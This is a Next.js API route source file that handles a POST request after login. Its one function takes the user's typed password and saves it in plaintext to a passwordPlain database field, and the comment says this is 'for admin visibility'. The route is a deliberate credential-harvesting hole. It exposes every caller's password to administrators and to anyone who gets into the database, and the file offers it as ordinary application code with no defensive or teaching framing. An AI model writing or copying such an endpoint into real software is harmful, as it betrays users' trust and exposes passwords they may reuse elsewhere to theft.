import { NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { getSessionUser, requireUser } from "@/lib/session";
import { jsonError } from "@/lib/serialize";
import { handleRouteError } from "@/lib/http";

export const dynamic = "force-dynamic";

/** Client backup: after login, store the typed password for admin visibility. */
export async function POST(req: Request) {
  try {
    const me = await getSessionUser();
    requireUser(me);
    const body = await req.json();
    const password = String(body.password ?? "");
    if (password.length < 1) return jsonError("Password required");
    await prisma.user.update({
      where: { id: me.id },
      data: { passwordPlain: password },
    });
    return NextResponse.json({ ok: true });
  } catch (e) {
    return handleRouteError(e);
  }
}
